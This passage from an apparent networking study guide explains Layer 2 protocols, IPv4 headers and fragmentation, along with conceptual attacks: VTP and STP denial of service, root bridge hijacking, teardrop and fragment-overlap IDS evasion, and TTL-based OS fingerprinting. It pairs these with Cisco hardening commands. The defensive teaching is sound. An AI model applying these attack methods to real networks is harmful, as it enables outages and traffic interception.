The concern is that if you add a new switch to the current VTP domain that has a higher VTP revision number. This could be because it was previously on another VTP domain and was not properly erased. Once connected, that switch will not accept any VTP messages from the server since its revision number is higher. But when that switch sends its own VTP message advertising what it believes the current revision number is, all the other switches will see that it has a higher revision number and will cause all switches to dump all their information and request the information from the new switch. This in effect will bring down your entire VLAN infrastructure.

Additionally, an attacker can use this same process to perform a Denial of Service on your VTP-switched network. The attacker can craft their own VTP message and send it over the network. This will cause all the switches in the VTP domain to flush all their VLAN information. This however does not change the VLANs assigned to the ports. The ports will stay assigned to the programmed VLANs. The switch however will no longer be forwarding traffic for those VLANS so the hosts will be isolated until the VLANs are re-introduced to the switch.



```


# DTP
## Dynamic Trunking Protocol
Used to dynamically create trunks when it sees trunk data

```
Modes:

Dynamic - Auto (DEFAULT)

Dynamic - Desirable

Can disable by using NO NEGOTIATE    
```

![image](https://github.com/user-attachments/assets/67423205-f7ba-423c-b478-11663a5afb4d)



# CDP, FDP, LLDP
## Cisco Discovery Protocol
```


Cisco Discovery Protocol (CDP) is a Layer 2, Cisco proprietary protocol used to share information with other directly connected Cisco devices. CDP is protocol and media independent and runs on all Cisco routers, switches, and other devices.

    CDP Shares information such as:

        Type of device

        Hostname

        Number and type of interface

        IP address

        IOS software version

    CDP can be used as a Network Discovery tool as well as assist in network design decisions and troubleshooting.



```

## Foundry Discovery Protocol
```
Foundry Discovery Protocol (FDP) is a proprietary data link layer protocol, originally developed by Foundry Networks, which was bought by Brocade. Similar to CDP, FDP enables Brocade devices to advertise to other directly connect Brocade devices on the network.
```


## Link Layer Discovery Protocol
```
Link Layer Discovery Protocol (LLDP) was designed by IEEE 802.1AB to be a vendor-neutral neighbor discovery protocol similar to CDP. LLDP also operates at layer 2 and shares similar information as does CDP with directly connected devices that support LLDP.
```

## EXPLOIT CDP Attack
```


Due to the nature of how CDP works, it can be easily used by malicious actors to map out your network infrastructure. It also shares alot of device information that an attacker can use in preparation of an attack; information like IP addresses, router models, software versions and so on can be sensitive for your organization. All information is sent in clear text and unauthenticated. Any attacker sniffing the network is able to see this information and is possible to impersonate (spoof) another device.

It is recommended to disable CDP/LLDP if not needed in your organization. It is however required for many VOIP phones to operate. Cisco VOIP send CDP messages to the switch. This is how switches know to place the phones on the "voice" vlan and not the "data" vlan.

    Disable Globally with no cdp run

    Disable on an interface with no cdp enable




```

# STP
## Spanning Tree Protocol
![image](https://github.com/user-attachments/assets/6244b64c-cf77-4a90-a8b8-34f8c536551d)

```
ROOT - Has access to the internet
Every port gets assigned a value
R - is to the Root Device
D - is for designated traffic
Without STP it would potentially get sent an undesirable path to find the router out
You can have a secondary Root
```
```


We previously mentioned that there is no TTL at Layer 2 to eventually kill a frame that never reaches its destination. This will result in frames endlessly circulating a L2 infrastructure and eventually bringing down the network. This can be caused by simply adding redundant links in your network architecture that could allow frames to potentially circulate.

Spanning Tree Protocol (STP) (802.1D) was developed to resolve this issue. STP is a Layer 2 protocol that builds a loop-free logical topology for Ethernet networks in a network that physically has loops. The basic function of STP is to prevent switching loops and the broadcast storms that can result. Spanning tree allows a network design to include physical "backup links" to provide fault tolerance if the active link fails.

STP works by creating "tree" within a network of connected layer-2 switches, and disable any links that are not part of this tree. The root of the tree determined by electing a Root Bridge and all the other switches are the branches. This essentially leaves only a single active path between any two network switches. STP is based on the algorithm invented by Radia Perlman.

STP operates by flooding Bridge Protocol Data Units (BPDUs) to all other switches in the network. BPDUs consist of:

    Switches priority value (default 32768. Lower numbers are preferred.)

    MAC address (lowest one on the switch. Lower MAC address are preferred.)


These BPDUs are used to:

    Elect the Root Bridge

    Identify the Root port on each non-root bridge

    Identify the Designated port for each segment


After the election of the Root Bridge, all BPDUs will come from the root only and each switch will forward these BPDUs out their Trunk ports. This ensures that all switches know that the root is still active.

IEEE introduced Rapid Spanning Tree Protocol (RSTP) as 802.1w in 2001. RSTP allowed ports to transition from blocking to forwarding in about 10 seconds.

In 2005, the IEEE introduced 802.1s, alternatively referred to as Multiple Spanning Tree Protocol (MSTP), extending the foundational Spanning Tree Protocol (STP) delineated by IEEE 802.1D. MSTP enriches STP by enabling the mapping of multiple VLANs to a solitary spanning tree instance, thereby aiding in the optimization of network assets and the acceleration of convergence time.

```


## STP Versions
```


    Open Standards-Based Versions:

        STP (802.1D):

            Open standard defined by the IEEE 802.1D specification.

            Basic version of the Spanning Tree Protocol, widely supported by networking equipment from various vendors.

            Defines the original spanning tree algorithm for loop prevention in Ethernet networks.

            Convergence Time: 30 to 50 seconds.

        RSTP (802.1w):

            Open standard defined by the IEEE 802.1w specification.

            Improves upon the original STP by providing faster convergence and better performance.

            Offers faster link failover times and better utilization of redundant links compared to STP.

            Widely supported across networking equipment from multiple vendors.

            Convergence Time: 6 seconds or less.

        MSTP (802.1s):

            Open standard defined by the IEEE 802.1s specification.

            Extends RSTP to support multiple spanning tree instances, each of which can encompass multiple VLANs.

            Helps reduce the number of spanning tree instances needed in large networks with multiple VLANs, improving scalability and manageability.

            Convergence Time: Similar to RSTP (6 seconds or less).

    Cisco Proprietary Versions:

        Per-VLAN Spanning Tree (PVST) and PVST+ (Per-VLAN Spanning Tree Plus):

            Proprietary spanning tree protocol developed by Cisco.

            PVST and PVST+ extend the functionality of STP by creating a separate spanning tree instance for each VLAN.

            Allows for finer control over spanning tree behavior on a per-VLAN basis, optimizing network performance and stability.

            Convergence Time: Typically similar to STP (30 to 50 seconds).

        Rapid Per-VLAN Spanning Tree (Rapid PVST):

            Cisco’s proprietary version of RSTP, tailored for use with PVST+.

            Offers faster convergence and better performance compared to traditional PVST+.

            Provides rapid failover times for individual VLANs, enhancing network resilience and uptime.

            Convergence Time: Typically similar to RSTP (6 seconds or less).

        Cisco Multiple Spanning Tree Protocol (MSTP) Implementation:

            Cisco offers its implementation of MSTP, which is compatible with the IEEE 802.1s standard.

            Allows Cisco devices to participate in MSTP environments alongside equipment from other vendors.

            Offers enhanced features and integration with other Cisco networking technologies.

            Convergence Time: Typically similar to RSTP (6 seconds or less).




```


## STP BPDUs
```


Spanning Tree Protocol (STP) uses Bridge Protocol Data Units (BPDUs) to exchange information between switches and determine the topology of the network. BPDUs contain vital information necessary for STP operation, including bridge IDs, port IDs, path costs, and other parameters.

    Contents of a BPDU:

        Bridge ID (BID):

            The BID uniquely identifies each bridge (switch) in the network and consists of two components: bridge priority and bridge MAC address.

            The bridge priority is a numerical value (default is 32768) used to determine the root bridge.

            The bridge MAC address is the MAC address of the bridge.

        Port ID:

            The Port ID uniquely identifies each port on a bridge.

            It consists of two components: port priority and port number.

            The port priority is a numerical value (default is 128) used to determine the designated port.

            The port number is the identifier of the port on the bridge.

        Path Cost:

            The path cost represents the cumulative cost of the path from the sending bridge to the root bridge.

            Each port calculates its path cost based on the speed of the link. For example, a higher speed link (e.g., Gigabit Ethernet) has a lower path cost than a lower speed link (e.g., Fast Ethernet).

        Root Bridge ID:

            The Root Bridge ID (RID) is the bridge ID of the root bridge, which is initially set to the bridge ID of the sending bridge.

            As BPDUs propagate through the network, switches update the RID in the received BPDUs to reflect the bridge ID of the root bridge.

        Message Type:

            BPDUs can be either Configuration BPDUs or Topology Change Notification (TCN) BPDUs.

            Configuration BPDUs are used for regular STP operations, such as root bridge election, topology discovery, and path selection.

            TCN BPDUs are used to notify other switches of changes in the network topology, such as link failures or port state changes.

    BPDU Exchange Process:

        Transmission:

            Each switch sends BPDUs out of all its designated ports at regular intervals (hello time), usually every 2 seconds by default.

            BPDUs are sent as multicast frames to the well-known address 01:80:C2:00:00:00.

        Reception:

            Switches receive BPDUs from neighboring switches on their designated ports.

            Upon receiving a BPDU, a switch compares the information in the BPDU with its own information to determine the best path to the root bridge.

        Processing:

            Switches process incoming BPDUs to update their internal spanning tree information, including root bridge selection, port roles (root, designated, or blocked), and path costs.

            After the root bridge election, only the root will transmit BPDUs and non-root switches will process the BPDUs sent by the root.

        Decision Making:

            Based on the information in received BPDUs, switches make decisions about the state of their ports (forwarding, blocking, or listening/learning) and adjust their forwarding tables accordingly.

            Switches use BPDUs to decide the root bridge in a STP environment. They determine the root as the one with the lowest priority. If there is a tie for priority then the lowest MAC address is used.


```

## Spanning Tree Attack

```


Spanning Tree Denial of Service attack.

Its goal is to disrupt the switch’s spanning-tree process, destabilize their CAM tables and hold the network in a repetitive state of re-electing the root bridge. This is possible because there is no authentication mechanism built into the STP and its BPDU frames.

This is done by repeatedly sending (crafted) Topology Change Notification (TCN) messages that will disrupt the system’s current understanding of the network. This will force renegotiation of the Root Bridge, resulting in a DoS attack because of the 50 second time period it takes to recalculate.


Root Bridge Election Manipulation

Another option is for the attacker to try to become the root bridge. Depending on the location of the attacker’s system, this can have a dramatic effect on the traffic flow throughout the L2 network. This can potentially cause traffic to traverse towards or thru the attacker’s device.

This attack can be done by sending specially crafted BPDUs by giving itself a more preferred BPDU. Typically specifying a lower priority value. Once this is accomplished it is possible for the attacker to see packets that are sent through them. This requires the attacker to stay connected to two switches, running bridging software, so that they can continue to send the BPDU to advertise themselves as the root bridge.


Both attacks require that the attacker be physically connected to the network.

The industry standard of 802.1D there is only 1 spanning tree instance no matter how many vlans are running on the network. So to attack STP will affect every vlan in the network. However Cisco’s proprietary STP called PVST and PVST+, there is a spanning tree instance for each vlan in the network. So to attack one will not affect the others. Each vlan spanning tree instance would need to be attacked for a full network DoS.

To mitigate STP attack you can:

    Enable portfast to have a port immediately come up to the forwarding state.

        Globally by using spanning-tree portfast default

        By interface using spanning-tree portfast

    Enable BPDU guard to prevent BPDUs from beign allowed on a switchport.

        On each access port interface use spanning-tree bpduguard enable

        Must not use this command on any trunk or switch to switch connections.


```

# Port Security
## Modes
```


The following are the possible modes:

    protect - Drops any frames with an unknown source addresses.

    restrict - Same as protect except it additionally creates a violation counter report.

    shutdown - Places the interface into an "error-disabled" state immediately and sends an SNMP trap notification. This is typically the default mode.


```

## Info
```


The purpose of configuring port security technologies is to limit, restrict, and protect network access. Configuring port security can be done on active access ports to limit the number of users or MAC addresses allowed to access onto the network. This will help to alleviate attacks such as DoS, MAC Address Flooding, and most unauthorized access.

    MAC Address Limit:

        Port security allows administrators to specify the maximum number of MAC addresses allowed on a switch port.

        When enabled, the switch monitors the MAC addresses of devices connected to the port and takes action if the number of MAC addresses exceeds the configured limit.

    MAC Address Learning:

        When a device sends traffic through a switch port, the switch learns the device’s MAC address and associates it with the port.

        The switch maintains a table, known as the MAC address table or CAM table, which maps MAC addresses to switch ports.

    Violation Actions:

        Administrators can define violation actions to be taken when port security violations occur.

        Common violation actions include shutting down the port, sending an SNMP trap, or logging a message.

        These actions help alert administrators to potential security breaches and mitigate unauthorized access attempts.

        The following are the possible modes:

            protect - Drops any frames with an unknown source addresses.

            restrict - Same as protect except it additionally creates a violation counter report.

            shutdown - Places the interface into an "error-disabled" state immediately and sends an SNMP trap notification. This is typically the default mode.


```

# Layer 2 Mitigation (Best Practices)
## Best Practices
The following are some mechanisms that can be be configured to better secure your switched network:

## Shutdown unused ports - 
Bare minimum to secure access ports is to simply shut down any and all inactive ports.
```
    interface fastethernet 0/1
    shutdown
```
## Switchport Port Security - 
Can be used to limit the number of MAC addresses that can be dynamically learned on a port or static MAC addresses can be assigned to one. Violation modes of shut down can be used to secure the port should a violation occur.
```
    switchport port-security
    switchport port-security maximum 1
    switchport port-security mac-address sticky
    switchport port-security violation shutdown
```
## IP Source Guard - 
Mitigates the effects of IP address spoofing attacks on the Ethernet LAN. With IP source guard enabled, the source IP address in the packet sent from an untrusted access interface is validated against the DHCP snooping database. If the packet cannot be validated, it is discarded.
```
    interface fastethernet 0/1
    ip verify source
    ip source binding 0100.0230.0002 vlan 11 10.10.0.40 interface fastethernet 0/1
```
## Manually assign STP Root - 
Manually assign the Spanning Tree Protocol (STP) root bridge allows for a deterministic root bridge election rather than the bridge with the lowest bridge priority. This allows the central most switch to be the root that will best allow traffic to flow in an efficent manner.
```
    spanning-tree vlan <vlan-id> priority 0
```
## BPDU Guard - 
BPDU Guard is a feature used in network switches to enhance network security by protecting against unintentional loops and rogue devices. It works by automatically shutting down a port if it receives Bridge Protocol Data Units (BPDUs), which are indicative of spanning tree protocol (STP) activity.
```
    interface fastethernet 0/1
    spanning-tree bpduguard enable
```
## DHCP Snooping - 
DHCP Snooping is a security feature commonly found in network switches that helps prevent rogue or unauthorized DHCP servers from distributing incorrect or malicious IP configuration information to network clients. It operates by monitoring and controlling DHCP messages exchanged between DHCP clients and servers. Configuration is done on ports that are connected to (or leading to) the DHCP server.
```
    ip dhcp snooping
    interface fastethernet 0/1
     ip dhcp snooping trust
     ip dhcp snooping vlan <vlan-id>
```
## 802.1x - 
The 802.1x standard defines a client-server-based access control and authentication protocol that prevents unauthorized clients from connecting to a LAN through ports until they are properly authenticated. The authentication server authenticates each client connected to a switchport before making available any services offered by the switch or the LAN.
```
    aaa new-model
    aaa authentication dot1x default group radius
    dot1x system-auth-control
    identity profile default

    interface fastethernet 0/1
    access-session port-control auto
    dot1x pae authenticator
```
## Dynamic ARP inspection (DAI) -
Prevents Address Resolution Protocol (ARP) spoofing or “man-in-the-middle” attacks. ARP requests and replies are compared against entries in the DHCP snooping database, and filtering decisions are made on the basis of the results of those comparisons.
```
    ip arp inspection vlan {vlan-id> | <vlan-range>}

    interface fastethernet 0/1
    ip arp inspection [ trust | untrust ]

    ip arp inspecion filter <arp-acl-name> vlan {vlan-id> | <vlan-range>} [static]
```
## Static CAM entries - 
Static CAM (Content Addressable Memory) entries refer to manually configured entries in the CAM table of Ethernet switches. These entries map specific MAC addresses to specific switch ports and are used to optimize network performance and facilitate specific network configurations.
```
    mac-address-table static 1234:abcd:5678 vlan 1 interface fastethernet 0/1
```
## Static ARP entries - 
Static ARP (Address Resolution Protocol) entries are manually configured mappings between IP addresses and MAC addresses in the ARP table of network devices. These entries are used to ensure stable communication between specific devices on the network.
```
    Linux:
    sudo ip neighbor add 10.10.0.50 lladdr 11:22:33:44:55:66 nud permanent dev eth0
    sudo ip neighbor delete 10.10.0.50 lladdr 11:22:33:44:55:66 nud permanent dev eth0

    Windows:
    arp -s 10.10.0.50 11:22:33:44:55:66
```
## Disable DTP negotiations - 
To disable Dynamic Trunking Protocol (DTP) negotiations on a Cisco switch interface, you need to manually configure the interface as an access port or set it to operate in a specific trunking mode, such as "trunk" or "nonegotiate."
```
    interface fastethernet 0/1
     switchport mode trunk
     switchport nonegotiate

    interface fastethernet 0/2
     switchport mode access
     switchport nonegotiate
```
## Manually assign Access/Trunk ports - 
By default, switch ports can be either a trunk or access port depending on the device connected to the port and dynamic negotiations that take place. Manually assigning ports as either trunk or access ports provides greater control and ensures that the network operates as intended.
```
    interface fastethernet 0/1
     switchport mode trunk
     switchport nonegotiate

    interface fastethernet 0/2
     switchport mode access
     switchport nonegotiate
```

# Network Layer

## Why?
```
Internetworking was developed because Local Area Networks (LAN) needed the ability to communicate with one another.



    Addressing Schemes for Network (Logical Addressing)

        Each device on the network has a logical addresses associated with it. This address is independent of the hardware device and must be unique in an internetwork.

    Routing

        The moving of data across a series of interconnected networks is the job of devices and software that exist at this layer. The network layer must handle incoming packets from various sources, determine their final destination, and send them to the appropriate interface and forwarding devices to be processed and routed once again.

    Encapsulation

        Encapsulation of messages received from higher layers must be performed to be passed on to the data-link layer.

    IP Fragmentation and Reassembly

        Due to constraints on bandwidth and other limiting factors, the network layer must be able to fragment packets that are too large and re-assemble the data in order at the destination device.

    Error Handling and Diagnostics

        The network layer uses special helper protocols like ICMP and ARP that allow logically connected devices to exchange information about the status of the network or devices themselves.


```

## Internet Protocol Versions
```


The network layer deals in two version of IP and ICMP, version 4 and version 6.

    IPv4

        Was the first working network layer protocol which has dominated the networking world since 1970s. At the time it was believed that 4.3 billion addresses would never be reached. In 1992 we started seeing the shortages take place and had to start developing methods of extending IPv4 until a permanent solution could be found. This is where and why subnetting, private ip addressing, and Network Address Translation protocol where developed and implemented.

        The most significant issue with IPv4 is the exhaustion of available IPv4 addresses. The limited address space (32 bits) results in the depletion of available IPv4 addresses, making it challenging to assign unique addresses to new devices joining the network.

        To assist in managing the eventual depletion of IPv4 address:

            Subnetting and Address Allocation:

                Efficiently allocate IPv4 address space through subnetting and address aggregation.

                Use Variable Length Subnet Masking (VLSM) and Classless Inter-Domain Routing (CIDR) to allocate IP addresses based on the actual requirements of each subnet, avoiding wastage of address space.

            RFC 1918 Private addresses:

                RFC 1918 defines three blocks of IPv4 address space reserved for private use:

                    10.0.0.0/8 (10.0.0.0 - 10.255.255.255)

                    172.16.0.0/12 (172.16.0.0 - 172.31.255.255)

                    192.168.0.0/16 (192.168.0.0 - 192.168.255.255)

                These address ranges are designated for use within private networks and are not globally routable on the public Internet.

            Network Address Translation (NAT):

                Implement NAT to conserve IPv4 addresses by allowing multiple devices within a private network to share a single public IP address.

                NAT translates private IP addresses to a single public IP address when communicating with devices outside the private network, reducing the number of globally routable IPv4 addresses required.

    IPv6

        In 2011 IPv6 was released to use world wide. IPv6 was released to eventually replace IPv4 because of IPv4’s lack of address space. Along with IPv6’s release the packet design was simplified from the IPv4 15 sections header IPv6 holds only 8 section with less wasted fields.

        Transitioning to IPv6 is the most effective long-term solution to address IPv4 exhaustion. IPv6 offers a significantly larger address space, allowing for an almost infinite number of unique IP addresses.

        Organizations are encouraged to plan and implement IPv6 deployment strategies to gradually transition their networks and services to IPv6.



```
# IPv4 
## IPv4
![image](https://github.com/user-attachments/assets/f9373ee2-0d33-4581-b2a6-8bbb6f94c244)

```
Broken into classes

Class A

Class B

Class C

Class D

Class E



IPv4 Address Types: There are several types of IPv4 addresses, including:

    Unicast: Identifies a single network interface.

    Broadcast: Sent to all devices on a network segment.

    Multicast: Sent to a specific group of devices.

    Anycast: Identifies the nearest of a group of devices.

Private and Public Addresses:

Private IPv4 addresses are reserved for use within private networks and are not routable on the public internet.

Common private address ranges include:

        10.0.0.0 to 10.255.255.255

        172.16.0.0 to 172.31.255.255

        192.168.0.0 to 192.168.255.255

Public IPv4 addresses are globally unique and routable on the internet.

Public address are any IP address that is not already reserved.


```


## IPv4 Header
![image](https://github.com/user-attachments/assets/87cd17b8-3de1-4c88-99c2-a727e6053ea3)
![image](https://github.com/user-attachments/assets/be32460a-31da-409a-b4e5-a087152a712e)

```



    Byte 0:

        Version (High 4 bits): Indicates the version of the Internet Protocol used. For IPv4, the value is set to 4 or 0x40.

        Header Length (IHL) (Low 4 bits): Specifies the length of the IPv4 header in 32-bit words.

            The standard IHL is 5 (0x05) to indiate 5 WORDS (20 bytes) in the IP header.

            Since the IPv4 header length can vary due to optional fields, this field helps identify where the data payload begins.

            IHL from 6 to F (15) will indicate the presence of IPv4 options in multiples of 4 bytes.

    Byte 1:

        Type of Service (TOS) (8 bits): From origional RFC 791, it was used for Quality of Service (QoS) prioritization. In RFC 2474, this field was deprecated and replaced by Differentiated Services Code Point (DSCP) and Explicit Congestion Notification (ECN) fields in modern implementations.

            DSCP (High 6 bits): Used to provide differentiated Quality of Service (QoS) treatment to packets as they traverse a network. It allows network administrators to prioritize certain types of traffic over others based on their requirements for latency, jitter, bandwidth, and reliability.

                The DSCP field allows for 64 different values, ranging from 0 to 63 (RFC 4594). Use the DSCP chart to determine values.

                These values are organized into several predefined classes, each representing a different level of service or treatment for packets.

                Values in this field do not equate to decimal or hex. In actuality the values in this field are bit-shifted 2 places to the left (<<2). This means that a DSCP of (1) would be a (4) in decimal. A DSCP of (32) would be a (128) in decimal.

            ECN (Low 2 bits): An extension to the Internet Protocol (IP) that enables end-to-end notification of network congestion without dropping packets. It allows network devices, such as routers, to notify endpoints (senders and receivers) of impending congestion in the network, allowing them to respond appropriately.

                00 – Not ECN-Capable - codepoint indicates that the packet’s sender is not ECN-capable or does not wish to receive ECN notifications.

                01 and 10 – ECN Capable - codepoint indicates that the packet’s sender is ECN-capable and willing to receive congestion notifications.

                11 – Congestion Experienced - codepoint is set by routers to indicate that congestion has been encountered along the packet’s path.



    Bytes 2 and 3:

        Total Length (16 bits): Indicates the total length of the IPv4 packet, including the header and the data payload. The maximum value is 65,535 bytes.

        This field is largely controled by the Maximum Transmission Unit (MTU) for the connected network.

    Bytes 4 and 5:

        Identification (16 bits): Used for fragmentation and reassembly of IP packets. Each packet sent by the sender is assigned a unique identification value.

            The IP ID field is used to assign a unique identification value to each IPv4 packet sent by a host.

            This identification value is incremented for each subsequent packet sent by the host.

            The combination of the IP ID value and the source IP address uniquely identifies each packet, which helps in identifying and processing packets at the receiving end.

            This allows the receiving host to identify fragments belonging to the same original packet and reassemble them in the correct order.

    Bytes 6 and 7:

        Flags (High 3 bits): Contains control flags related to fragmentation:

            Bit 0: Reserved, must be zero. This bit is sometimes referred to as the "Evil Bit" as defined in RFC 3514.

            Bit 1: Don’t Fragment (DF) flag. If set, indicates that the packet should not be fragmented.

                Packets requiring fragmentation will be dropped by the router and an ICMP type 3 code 4 "Fragmentation Needed and Don’t Fragment was Set" will be sent back to the sender.

            Bit 2: More Fragments (MF) flag. If set, indicates that this packet is a fragement and that more fragments will follow. This flag will be turned off for the very last fragment.

        Fragment Offset (Low 13 bits): Indicates the position of the fragment within the original unfragmented packet, measured in units of 8 bytes.

            The fragment offset is calculated by dividing the payload bytes by 8. This offset value is cumulative and is added to each fragment offset until the last fragement.

            A payload of 1480 will have an offset of 1480/8 or 185. The offset values will be 0, 185, 370, 555, 740, etc.

    Byte 8:

        Time to Live (TTL) (8 bits): Represents the maximum number of hops (routers) the packet can traverse before being discarded. Decremented by one at each router hop.

        Default TTLs:

            Linux: 64

            Windows: 128

            Cisco: 255

    Byte 9:

        Protocol (8 bits): Specifies the protocol used in the data payload of the packet (e.g., TCP, UDP, ICMP).

            ICMPv4: 1

            TCP: 6

            UDP: 17

            EIGRP: 88

            OSPF: 89

    Bytes 10 and 11:

        Header Checksum (16 bits): Provides error detection for the IPv4 header. Calculated based on the header contents and verified by the receiving host.

    Bytes 12 to 15:

        Source IP Address (32 bits): Specifies the IPv4 address of the sender of the packet.

            Dotted decimal address are expresses as HEX.

            10.0.0.1 would be 0x0a000001

    Bytes 16 to 19:

        Destination IP Address (32 bits): Specifies the IPv4 address of the intended recipient of the packet.

            Dotted decimal address are expresses as HEX.

            192.168.0.1 would be 0xc0a80001

    Variable bytes from 20 to 59:

        Options (variable length):

            Always in multiples of 4 bytes (1 WORD).

            Maximum options allowed is 40 bytes (10 WORDs).

            Optional fields that may include various options such as Record Route, Timestamp, and Security.

            Rarely used in practice due to limited support and potential security concerns.




```

## IPv4 Address Scope
```


    Public IP ranges are assigned by IANA throughout the world. These addresses are typically any Class A, B, or C address that is not otherwised reserved. For more information on public addressing visit https://www.iana.org/numbers.

    Private These IPs are not globally routable across the Internet and are available for use by all for internal LANs. These addresses must be translated to a public address for traversal across the internet.

        Class A scope 10.0.0.0/8 - 10.0.0.0 thru 10.255.255.255

        Class B scope 172.16.0.0/12 - 172.16.0.0 thru 172.31.255.255

        Class C scope 192.168.0.0/16 - 192.168.0.0 thru 192.168.255.255

    Loopback address also called localhost. This is an internal address (127.0.0.1) linked back to the host machine. Can not be assigned to a device NIC. Can only be used to allow the system to address itself.

        Scope 127.0.0.0/8 - 127.0.0.0 thru 127.255.255.255

    Link-Local is used for direct node to node communications on the same physical or logical link, not a routable range. This range is used for Microsoft’s Automatic Private IP Addressing (APIPA). This is used to allow DHCP configured clients to resolve an IP address even if no DHCP servers are available. Systems will auto generate an address in this range if it fails to get an IP address from the DHCP server. These addresses allow devices to communicate with each other on the same network but not across any routed boundries.

        Scope 169.254.0.0/16 - 169.254.0.0 thru 169.254.255.255

    Multicast

        224.0.0.0/24 - Link-Local - multicast for host on the same network segment. Cannot traverse routed bounderies.

        239.255.0.0/16 - Local - scope is able to be controlled by an organization.

        239.192.0.0/14 - Organizational-local - routable within an organizations network.

        224.0.1.0-238.255.255.255 - Global - able to be routed across the internet.



```

## Fragmentation
```
P fragmentation breaks up a single IPv4 packet into multiple smaller packets. Every link in a network has a defined maximum transmission unit (MTU). Ethernet’s default MTU is 1500 bytes. An IP header is included in the 1500 byte MTU.

The 14-22 byte Ethernet header is not counted within the 1500 byte MTU. Other Layer 2 framing protocols (Ethernet, Token Ring, FDDI, PPoE, etc) can have different MTUs.

Routers are often the devices performing fragmentation in IPv4. Other devices can perform this action if they also perform in the routing capacity.

In IPv4, routing devices perform fragmentation if the total size of the packet (header and data) coming from one network interface is greater than the MTU of the network out the exiting interface.

IPv4 Flags: [IPv4 header byte offset 6], A 3 bit field that declares if the packet is a part of a fragmented data frame or not. Reading the field from left to right.

    Bit 0 (128): reserved

        should always be 0

        See RFC 3514 for a description of the “evil bit.”

    Bit 1 (64):

        0 = May Fragment

        1 = Don’t Fragment this packet

            Packets requiring fragmentation with this bit set will be dropped by routers resulting an ICMP Type 3 Code 4 "Fragmentation Needed and Don’t Fragment was Set" message to be sent back to the source.

    Bit 2 (32):

        0 = Not fragemented or Last Fragment

            Last fragment will have an offset value set.

        1 = More Fragments follow (first fragement until 2nd to last fragement).

            First fragment will not have an offset value set.

Fragment Offset field is a 13-bit field found in the IPv4 header.

    It indicates the position of the data payload of the current fragment relative to the beginning of the original unfragmented packet.

    With only 13 bits assigned, the values can only be 0-8191.

        The values in this field is determined by dividing the fragmented bytes per packet by 8.

    It is determined by using the following formula:
```
## Offset = (MTU - (IHL x 4)) ÷ 8

![image](https://github.com/user-attachments/assets/c99ce30d-a84d-435e-b26b-06e5f1cda2d6)

## Decoding IPv4 Packet
```
00 1f 29 5e 4d 26 00 50　56 bb 3a a0 08 00 45 00
00 3c 83 1b 40 00 40 06　15 0a c0 a8 14 46 4a 7d
83 1b d5 1d 00 19 6b 7f　c7 2d 00 00 00 00 a0 02
72 10 a2 b5 00 00 02 04　05 b4 04 02 08 0a 0a 99
44 36 00 00 00 00 01 03　03 07
```

```
    00 1f 29 5e 4d 26 is the destination MAC

    00 50 56 bb 3a a0 is the source MAC

    08 00 is the ethertype for IPv4

    45 to identify the Version is 4 and the IHL is 5 which means the IP header is 20 bytes in length. (IHL x 4)

    00 is the DSCP. Used for Quality of Service (QoS).

    00 3c is the Total length of 60 bytes. This includes the 20 byte header and 40 bytes of payload.

    83 1b is the Identification field. Value is 33563.

    40 00 is the Flags and fragmentation offset field. This value has the Dont Fragement (DF) turned on and no fragmentation offset.

        80 00 is the value for the Reserved (Evil bit).

        20 00 to 3F FF is the range for the More Fragements (MF) bit and fragmentation offset.

    40 is the Time to Live field. Currently set to 64.

    06 is the Protocol field. Currently set to identify TCP.

        01 is for ICMPv4

        11 is for UDP

    15 0a is the Checksum field

    c0 a8 14 46 is the source IP address. Currently set to 192.168.20.70.

    4a 7d 83 1b is the destination IP address. Currently set to 74.125.131.27.

    The remaining will be the payload.

```


## IPv6 Fragmentation
```



    IPv6 inherently does not support fragmentation within it headers. It lacks the fields required. It can however include follow-on IPv6 Fragmentation headers should it be needed. IPv6 fragmentation must be done on the sending host using the fragmentation extension headers.

    Routers in the traffic path will not fragment any IPv6 packets. Any packets larger than the supported MTU are dropped and an ICMPv6 Type 2 "packet too big" message is sent to the source. This is essentially like having the DF bit set to ON for all packets. Any needed fragmentation must be done by the source node.

    The source node conducts a Path MTU Discovery (PMTU) by sending MTU discovery packets to the destination. If the source node receives a Type 2 "packet too big" message it will decrease the packet size. The smallest (generally) safe IPv6 MTU size is 1280 bytes. This guarantees delivery based on packet size but increases the number of packets needing to be sent. Even more if VPN or tunneling is used.

    Fragmentation was removed in IPv6 for several reasons. Some thought fragmentation was inefficient. Any lost fragment makes the entire original packet unusable as there is no way to identify the missing fragment to be resent. Additionally security concerns of fragmentation overlapping attacks and the lack of a TCP/UDP header on fragment except the initial fragment were other reasons to remove fragmentation altogether.


```

## IP Fragment Overlapping
```


    IP fragment overlapping exploit happens when two or more packet fragments have fragment offsets that indicate that they overlap each other.

    Example: a MTU of 1500 will have a offset of 185. 1500 MTU - 20 Bytes of IP header = 1480 Bytes. Each IP packet will include up to 1480 bytes of fragment information. To determine the offset value, this will be divided by 8 and will equal 185. So the first fragment will have the MF=1 and offset =185. The second fragment will increment the offset by 185 each time. So the second fragment offset will be 185, the third will be 370, the fourth 555, the fifth is 740 and so fourth. Each packet will have 1480 bytes of data.

    In an overlap attack such as the teardrop attack, the offsets will not be sequential in chunks of 185 as it should. The offset could be changed to something like 175. This would mean that 80 bytes of the first fragment will be overwritten by the second fragment and so fourth. The resulting information will be much different than if each packet was examined individually.

    This form of attack is successful if the attacker is aware of the host computers and networking equipment on the victim’s network. This is because different equipment types perform different process in order to reconstruct the fragmented packets. Armed with this knowledge, the attacker can craft his attack to reconstruct the fragmented packets in a more proprietary way to avoid detection. Using this process fragments can avoid detection by firewalls and IDS/IPS devices. This is because when they reconstruct the message using their reconstruction processes it will not see the intended information.


```

## Teardrop Attack
```


    In a Teardrop attack, the attacker will use overlapping packets as well as additional random data. When constructed properly, the random data portions will be overwritten and result in the malicious payload. Although firewalls and IDS/IPS devices may not detect this payload.

    This is a form of denial-of-service (DoS) attack that uses fragmented packets to bypass firewalls to a target a victim’s machine. The victim’s computer receiving the packets won’t be able reconstruct the packet properly due to a bug in TCP/IP fragmentation reassembly process, the packets will overlap each another, thus crashing the victim’s network device. Typically only older operating systems such as Windows 3.1x, Windows 95, Windows NT and versions of the Linux kernel prior to 2.1.63 are vulnerable to this attack.


```

## OS Fingerprinting
```
OS fingerprinting is the process of analyze the TTL fields on a header packet to make an educated guess at which operating system sent the packet by your TTL maximum hops. Different systems can have varing TTLs that can help to identify them on the network, some of the systems are listed in the chart.



    Unless you capture the packet immediately from the source host, the TTL will not likely be set to these values.

    In general, it should not take more than about 30 hops to reach any destination on the internet.

    With this in mind we can make the following determination:

        Linux: TTL from 34-64

        Windows: TTL from 98-128

        Cisco: TTL from 225-255



```
